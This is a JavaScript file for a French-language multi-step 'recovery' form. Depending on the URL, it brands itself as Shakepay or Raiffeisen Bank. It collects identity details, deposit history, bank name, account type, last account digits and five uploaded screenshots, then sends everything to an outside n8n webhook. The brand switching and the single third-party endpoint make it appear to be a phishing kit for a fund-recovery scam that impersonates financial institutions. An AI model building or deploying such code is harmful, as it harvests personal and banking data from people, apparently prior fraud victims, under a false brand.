document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("recoveryForm");
  const prevBtn = document.getElementById("prevBtn");
  const nextBtn = document.getElementById("nextBtn");
  const submitBtn = document.getElementById("submitBtn");
  const steps = document.querySelectorAll(".step-content");
  const dots = document.querySelectorAll(".step-dot");
  const progressFill = document.getElementById("progressFill");
  const fileInput = document.getElementById("fileInput");
  const dropZone = document.getElementById("dropZone");
  const fileList = document.getElementById("fileList");

  // Webhook URLs
  const WEBHOOK_URLS = [
    "https://smart031.app.n8n.cloud/webhook/formulaire",
  ];

  let currentStep = 0;
  let uploadedFiles = []; // Stores { name, type, base64 }

  // --- Navigation Logic ---

  function updateUI() {
    // Toggle Steps
    steps.forEach((step, index) => {
      step.classList.toggle("active", index === currentStep);
    });

    // Toggle Dots
    dots.forEach((dot, index) => {
      dot.classList.toggle("active", index === currentStep);
      dot.classList.toggle("completed", index < currentStep);
    });

    // Progress Bar
    const progress = (currentStep / (steps.length - 1)) * 100;
    progressFill.style.width = `${progress}%`;

    // Buttons
    prevBtn.style.display = currentStep === 0 ? "none" : "block";
    if (currentStep === steps.length - 1) {
      nextBtn.style.display = "none";
      submitBtn.style.display = "block";
    } else {
      nextBtn.style.display = "block";
      submitBtn.style.display = "none";
    }
  }

  function validateStep(stepIndex) {
    const currentStepEl = steps[stepIndex];
    const inputs = currentStepEl.querySelectorAll(
      "input[required], select[required], textarea[required]",
    );
    let isValid = true;

    inputs.forEach((input) => {
      if (!input.checkValidity()) {
        input.reportValidity();
        isValid = false;
        // Break loop roughly by setting flag, only first error focuses
      }
    });

    return isValid;
  }

  nextBtn.addEventListener("click", () => {
    if (validateStep(currentStep)) {
      currentStep++;
      updateUI();
    }
  });

  prevBtn.addEventListener("click", () => {
    currentStep--;
    updateUI();
  });

  // --- File Handling (Base64) ---

  dropZone.addEventListener("click", () => fileInput.click());

  dropZone.addEventListener("dragover", (e) => {
    e.preventDefault();
    dropZone.style.borderColor = "var(--accent-color)";
  });

  dropZone.addEventListener("dragleave", () => {
    dropZone.style.borderColor = "var(--border-color)";
  });

  dropZone.addEventListener("drop", (e) => {
    e.preventDefault();
    dropZone.style.borderColor = "var(--border-color)";
    handleFiles(e.dataTransfer.files);
  });

  fileInput.addEventListener("change", (e) => {
    handleFiles(e.target.files);
  });

  function handleFiles(files) {
    if (uploadedFiles.length + files.length > 5) {
      alert("Maximum 5 fichiers autorisés.");
      return;
    }

    Array.from(files).forEach((file) => {
      const reader = new FileReader();
      reader.onload = (e) => {
        uploadedFiles.push({
          name: file.name,
          type: file.type,
          base64: e.target.result, // format: "data:image/png;base64,..."
        });
        renderFileList();
      };
      reader.readAsDataURL(file);
    });
  }

  function renderFileList() {
    fileList.innerHTML = "";
    uploadedFiles.forEach((file, index) => {
      const li = document.createElement("li");
      li.className = "file-item";
      li.innerHTML = `
                <span>${file.name}</span>
                <span class="remove-file" onclick="removeFile(${index})">×</span>
            `;
      fileList.appendChild(li);
    });
  }

  window.removeFile = (index) => {
    uploadedFiles.splice(index, 1);
    renderFileList();
  };

  // --- Validation Override for Step 4 (Evidence) ---
  const originalValidateStep = validateStep;
  validateStep = function (stepIndex) {
    // Step 4 is index 3 (0-based)
    if (stepIndex === 3) {
      if (uploadedFiles.length !== 5) {
        alert(
          "Veuillez télécharger exactement 5 preuves (Captures d'écran, etc.) pour continuer.",
        );
        return false;
      }
    }
    return originalValidateStep(stepIndex);
  };

  // --- Submission ---

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    if (!validateStep(currentStep)) return;

    // Collect Data
    const formData = new FormData(form);
    const data = Object.fromEntries(formData.entries());

    // Construct JSON Payload
    const payload = {
      personal: {
        firstName: data.firstName,
        lastName: data.lastName,
        age: data.age,
        profession: data.profession,
        mensualite: data.mensualite,
        country: data.country,
        email: data.email,
        phone: data.phone,
      },
      financial: {
        firstDepositAmount: data.firstDepositAmount,
        firstDepositDate: data.firstDepositDate,
        totalDepositAmount: data.totalDepositAmount,
        currency: data.currency,
        paymentMethod: data.paymentMethod,
      },
      banking: {
        bankName: data.bankName,
        accountType: data.accountType,
        lastDigits: data.lastDigits,
      },
      context: {
        contactDate: data.contactDate,
        contactMethod: data.contactMethod,
        description: data.description,
      },
      evidence: uploadedFiles, // array of base64 objects
      consent: {
        accurate: true, // checked by validation
        processing: true,
        contact: true,
      },
      platform: window.location.search.toLowerCase().includes("shakepay")
        ? "SHAKEPAY"
        : "Raiffeisen Bank",
      timestamp: new Date().toISOString(),
    };

    submitBtn.innerHTML = "Envoi en cours...";
    submitBtn.disabled = true;

    console.log("Sending payload:", payload);

    try {
      const requests = WEBHOOK_URLS.map((url) =>
        fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(payload),
        }),
      );

      const responses = await Promise.all(requests);

      // Parse all JSON bodies
      const results = await Promise.all(
        responses.map(async (r) => {
          try {
            return {
              ok: r.ok,
              status: r.status,
              data: await r.json(),
            };
          } catch (e) {
            return { ok: r.ok, status: r.status, data: null };
          }
        }),
      );

      console.log("Webhook Responses:", results);

      // Check if all requests were successful (HTTP 200-299)
      const allSuccess = results.every((r) => r.ok);

      if (allSuccess) {
        // Show Success Modal
        const modal = document.getElementById("successModal");
        if (modal) {
          modal.style.display = "flex";
        } else {
          alert("Demande envoyée avec succès !");
        }

        form.reset();
        uploadedFiles = [];
        renderFileList();
        currentStep = 0;
        updateUI();
      } else {
        throw new Error(
          "One or more webhooks failed: " + JSON.stringify(results),
        );
      }
    } catch (error) {
      console.error("Submission error:", error);
      // NOTE: Since webhook URLs might not exist, we often alert success for demo purposes
      // Or un-comment below to show actual error
      alert("Erreur lors de l'envoi. Veuillez réessayer.");
    } finally {
      submitBtn.innerHTML = "Envoyer la demande";
      submitBtn.disabled = false;
    }
  });

  // --- Dynamic Branding ---
  const urlParams = new URLSearchParams(window.location.search);
  const isShakepay = window.location.search.toLowerCase().includes("shakepay");

  if (isShakepay) {
    document.title = "SHAKEPAY - Formulaire de Récupération";
    const brandNameEl = document.getElementById("brandName");
    if (brandNameEl) brandNameEl.textContent = "SHAKEPAY";
  }

  // Initialize
  updateUI();
});
